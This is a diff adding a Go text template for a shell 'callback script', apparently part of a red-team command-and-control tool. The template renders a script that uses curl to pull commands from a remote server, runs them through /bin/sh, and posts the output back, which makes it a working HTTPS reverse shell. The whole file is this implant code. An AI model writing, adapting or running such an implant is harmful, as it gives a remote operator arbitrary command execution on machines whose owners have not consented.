@@ -1,0 +1,22 @@
+{{- /*
+     * script.tmpl
+     * Callback script template
+     * By J. Stuart McMurray
+     * Created 20240325
+     * Last Modified 20240327
+     */ -}}
+{{- define "curl" -}}
+curl -Nsk --pinnedpubkey "sha256//{{.PubkeyFP}}" https://{{.URL}}
+{{- end -}}
+#!/bin/sh
+
+{{template "curl" .}}/i/{{.ID}} </dev/null 2>&0 |
+/bin/sh 2>&1 |
+while read line; do
+	if ! {{template "curl" .}}/o/{{.ID}} --data-binary @- <<_eof-{{.ID}}; then
+$line
+_eof-{{.ID}}
+		break
+	fi
+done >/dev/null 2>&1
+{{/* vim: set filetype=gotexttmpl noexpandtab smartindent: */ -}}
